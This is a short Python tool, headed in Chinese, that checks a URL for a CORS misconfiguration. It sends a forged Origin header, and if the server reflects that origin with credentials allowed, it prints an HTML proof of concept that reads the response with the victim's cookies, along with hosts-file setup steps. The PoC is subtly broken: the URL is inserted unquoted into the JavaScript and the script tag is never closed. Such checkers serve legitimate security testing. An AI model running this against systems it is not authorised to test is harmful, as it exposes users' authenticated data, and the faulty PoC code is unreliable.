## 代码实现


```python
#python3
import requests
import sys

if len(sys.argv) < 2:
    print("requires a url parameter.")
    sys.exit(0)
else:
    url = sys.argv[1]

def CheckCORS(url):
    Origin = url+".test.com"
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Origin": Origin
    }

    POC = """
    <html>
    <script>
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
         alert(xhttp.responseText);
        }
    };
    xhttp.open("GET", """+url+""", true);
    xhttp.withCredentials=true;
    xhttp.send();
    <script>
    </html>
    """
    try:
        response = requests.get(url,headers=headers)
        acao_headers = response.headers['Access-Control-Allow-Origin']
        acac_headers = response.headers['Access-Control-Allow-Credentials']
        if acao_headers == Origin and acac_headers == "true":
            print("{} has a CORS vulnerability.".format(url))
            print("try to use poc:\n {}".format(POC))
            print("change hosts file to: 127.0.0.1  {}\nand put POC HTML file in HTTP Server.".format(Origin))
            return url
    except:
        pass

if __name__ == "__main__":
    CheckCORS(url)
    

```